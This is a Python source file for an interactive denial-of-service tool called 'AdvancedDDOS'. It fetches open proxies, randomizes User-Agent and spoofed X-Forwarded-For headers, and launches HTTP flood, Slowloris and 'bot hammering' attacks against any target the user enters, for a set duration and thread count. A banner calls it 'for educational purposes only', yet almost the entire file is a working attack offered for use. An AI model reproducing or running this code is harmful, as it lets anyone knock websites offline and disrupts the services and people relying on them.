import asyncio
import aiohttp
import socket
import random
import time
from dataclasses import dataclass
from typing import List, Dict, Optional
from concurrent.futures import ThreadPoolExecutor
from fake_useragent import UserAgent
from colorama import Fore, Style, init
from art import text2art
import logging
import signal
import sys
import json
from proxybroker import Broker
from tabulate import tabulate
import ssl
import certifi

# Initialize colorama
init(autoreset=True)

@dataclass
class AttackStats:
    total_requests: int = 0
    successful_requests: int = 0
    failed_requests: int = 0
    start_time: float = 0.0

class AdvancedDDOS:
    def __init__(self):
        self.user_agents = UserAgent()
        self.proxies: List[str] = []
        self.stats = AttackStats()
        self.running = True
        self.ssl_context = ssl.create_default_context(cafile=certifi.where())
        self._setup_logging()
        
    def _setup_logging(self):
        logging.basicConfig(
            level=logging.INFO,
            format=f'{Fore.CYAN}%(asctime)s{Style.RESET_ALL} - {Fore.GREEN}%(levelname)s{Style.RESET_ALL} - %(message)s',
            handlers=[
                logging.FileHandler('ddos_attack.log'),
                logging.StreamHandler()
            ]
        )
        
    async def _fetch_proxies(self, limit: int = 100) -> None:
        """Fetch working proxies asynchronously"""
        proxies = []
        broker = Broker()
        
        async def save(proxies):
            while self.running:
                proxy = await broker.get()
                if proxy and proxy.is_working:
                    proxies.append(f"http://{proxy.host}:{proxy.port}")
                    if len(proxies) >= limit:
                        break
        
        tasks = asyncio.gather(
            broker.find(types=['HTTP', 'HTTPS'], limit=limit),
            save(proxies)
        )
        
        try:
            await asyncio.wait_for(tasks, timeout=30)
        except asyncio.TimeoutError:
            pass
            
        self.proxies = proxies
        logging.info(f"Loaded {len(self.proxies)} working proxies")

    def _get_random_headers(self) -> Dict[str, str]:
        """Generate random headers for requests"""
        return {
            'User-Agent': self.user_agents.random,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'X-Forwarded-For': f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}",
            'Referer': f'https://www.google.com/search?q={random.randint(100000, 999999)}'
        }

    async def http_flood(self, target: str, session: aiohttp.ClientSession) -> None:
        """Asynchronous HTTP flood attack"""
        try:
            proxy = random.choice(self.proxies) if self.proxies else None
            async with session.get(
                target,
                headers=self._get_random_headers(),
                proxy=proxy,
                ssl=self.ssl_context,
                timeout=5
            ) as response:
                self.stats.total_requests += 1
                if response.status == 200:
                    self.stats.successful_requests += 1
                else:
                    self.stats.failed_requests += 1
        except Exception as e:
            self.stats.failed_requests += 1
            logging.debug(f"Request failed: {str(e)}")

    async def slowloris_attack(self, host: str, port: int) -> None:
        """Slowloris attack implementation"""
        sockets = []
        try:
            # Create multiple partial connections
            for _ in range(200):
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((host, port))
                s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode())
                s.send(f"User-Agent: {self.user_agents.random}\r\n".encode())
                s.send("Accept-language: en-US,en,q=0.5\r\n".encode())
                sockets.append(s)
            
            # Keep connections alive
            while self.running:
                for s in sockets:
                    try:
                        s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
                    except:
                        sockets.remove(s)
                        # Create new connection to maintain count
                        try:
                            new_s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            new_s.settimeout(4)
                            new_s.connect((host, port))
                            sockets.append(new_s)
                        except:
                            pass
                await asyncio.sleep(15)
        except Exception as e:
            logging.error(f"Slowloris error: {e}")
        finally:
            for s in sockets:
                try:
                    s.close()
                except:
                    pass

    async def bot_hammering(self, target: str, session: aiohttp.ClientSession) -> None:
        """Simulate bot traffic"""
        referers = [
            "https://www.google.com/",
            "https://www.facebook.com/",
            "https://twitter.com/",
            "https://www.bing.com/",
            "https://www.yahoo.com/"
        ]
        
        try:
            async with session.get(
                target,
                headers={
                    'User-Agent': self.user_agents.random,
                    'Referer': random.choice(referers)
                },
                ssl=self.ssl_context,
                timeout=5
            ) as response:
                self.stats.total_requests += 1
                if response.status == 200:
                    self.stats.successful_requests += 1
        except:
            self.stats.failed_requests += 1

    def _display_banner(self) -> None:
        """Show the tool banner"""
        print(Fore.MAGENTA + Style.BRIGHT + text2art("ADVANCED DDOS", font="block"))
        print(Fore.GREEN + "Next-Gen DDoS Simulation Tool - Python 3.10+")
        print(Fore.YELLOW + "Warning: For educational purposes only!")
        print(Style.RESET_ALL)

    async def get_target_info(self) -> Dict[str, str]:
        """Get target information from user"""
        self._display_banner()
        
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get('https://api.ipify.org?format=json') as resp:
                    pub_ip = (await resp.json())['ip']
                    print(f"{Fore.WHITE}Your IP: {Fore.RED}{pub_ip}{Style.RESET_ALL}")
        except:
            print(f"{Fore.RED}Could not fetch your public IP{Style.RESET_ALL}")
        
        target = input(f"{Fore.CYAN}Target URL/Domain (e.g., https://example.com): {Style.RESET_ALL}").strip()
        if not target.startswith(('http://', 'https://')):
            target = f"http://{target}"
            
        try:
            host = target.split('//')[1].split('/')[0]
            resolved_ip = socket.gethostbyname(host)
        except Exception as e:
            print(f"{Fore.RED}Invalid target: {e}{Style.RESET_ALL}")
            sys.exit(1)
            
        port = input(f"{Fore.CYAN}Port (default 80 for HTTP, 443 for HTTPS): {Style.RESET_ALL}").strip()
        port = int(port) if port else (443 if target.startswith('https') else 80)
        
        threads = input(f"{Fore.CYAN}Threads/Connections (default 500): {Style.RESET_ALL}").strip()
        threads = int(threads) if threads else 500
        
        duration = input(f"{Fore.CYAN}Attack duration in minutes (0 for unlimited): {Style.RESET_ALL}").strip()
        duration = float(duration) * 60 if duration else 0
        
        return {
            'target': target,
            'host': host,
            'ip': resolved_ip,
            'port': port,
            'threads': threads,
            'duration': duration
        }

    def _display_attack_info(self, info: Dict[str, str]) -> None:
        """Show attack configuration"""
        table = [
            ["Target URL", info['target']],
            ["Resolved IP", info['ip']],
            ["Port", info['port']],
            ["Threads", info['threads']],
            ["Duration", f"{info['duration']/60:.1f} mins" if info['duration'] else "Unlimited"]
        ]
        print(Fore.BLUE + tabulate(table, headers=["Parameter", "Value"], tablefmt='grid') + Style.RESET_ALL)

    async def run_attack(self, target: str, host: str, port: int, threads: int, duration: float) -> None:
        """Main attack controller"""
        # Fetch proxies first
        logging.info("Fetching proxies...")
        await self._fetch_proxies()
        
        # Setup signal handler for graceful shutdown
        def signal_handler(sig, frame):
            self.running = False
            print(f"\n{Fore.RED}Shutting down gracefully...{Style.RESET_ALL}")
            sys.exit(0)
            
        signal.signal(signal.SIGINT, signal_handler)
        
        # Start attack
        logging.info("Starting attack...")
        self.stats.start_time = time.time()
        
        connector = aiohttp.TCPConnector(limit=threads, force_close=True, ssl=self.ssl_context)
        async with aiohttp.ClientSession(connector=connector) as session:
            tasks = []
            
            # Create tasks for different attack types
            for i in range(threads):
                # Distribute attack types
                if i % 3 == 0:
                    tasks.append(self.http_flood(target, session))
                elif i % 3 == 1:
                    tasks.append(self.bot_hammering(target, session))
                else:
                    # Slowloris runs in separate threads due to socket operations
                    pass
            
            # Start socket-based attacks in thread pool
            with ThreadPoolExecutor(max_workers=threads//3) as executor:
                for _ in range(threads//3):
                    executor.submit(asyncio.run, self.slowloris_attack(host, port))
            
            # Run HTTP attacks
            while self.running:
                if duration and (time.time() - self.stats.start_time) > duration:
                    self.running = False
                    break
                    
                await asyncio.gather(*tasks)
                await self._display_stats()

    async def _display_stats(self) -> None:
        """Display current attack statistics"""
        elapsed = time.time() - self.stats.start_time
        rps = self.stats.total_requests / elapsed if elapsed > 0 else 0
        
        stats_table = [
            ["Duration", f"{elapsed:.1f} seconds"],
            ["Total Requests", self.stats.total_requests],
            ["Successful", self.stats.successful_requests],
            ["Failed", self.stats.failed_requests],
            ["Requests/sec", f"{rps:.1f}"]
        ]
        
        print("\n" + Fore.YELLOW + tabulate(stats_table, tablefmt='grid') + Style.RESET_ALL)
        await asyncio.sleep(5)

async def main():
    tool = AdvancedDDOS()
    target_info = await tool.get_target_info()
    tool._display_attack_info(target_info)
    
    confirm = input(f"{Fore.RED}Confirm attack? (y/n): {Style.RESET_ALL}").lower()
    if confirm != 'y':
        print(f"{Fore.GREEN}Attack canceled.{Style.RESET_ALL}")
        return
        
    await tool.run_attack(
        target=target_info['target'],
        host=target_info['host'],
        port=target_info['port'],
        threads=target_info['threads'],
        duration=target_info['duration']
    )

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}Attack stopped by user.{Style.RESET_ALL}")
    except Exception as e:
        logging.error(f"Fatal error: {e}")
        sys.exit(1)
